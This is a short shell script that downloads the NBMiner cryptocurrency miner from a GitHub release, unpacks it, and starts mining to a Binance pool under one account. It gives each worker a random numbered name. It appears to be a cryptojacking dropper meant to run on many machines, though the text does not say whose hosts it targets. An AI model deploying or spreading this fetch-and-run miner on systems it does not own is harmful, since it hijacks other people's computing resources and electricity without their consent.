#!/bin/sh 
apt install tar -y
wget https://github.com/NebuTech/NBMiner/releases/download/v39.5/NBMiner_39.5_Linux.tgz
tar xf NBMiner_39.5_Linux.tgz
cd NBMiner_Linux
./nbminer -a ethash -o stratum+tcp://ethash.poolbinance.com:1800 -u Koske.koske_$(echo $(shuf -i 1-9999 -n 1))
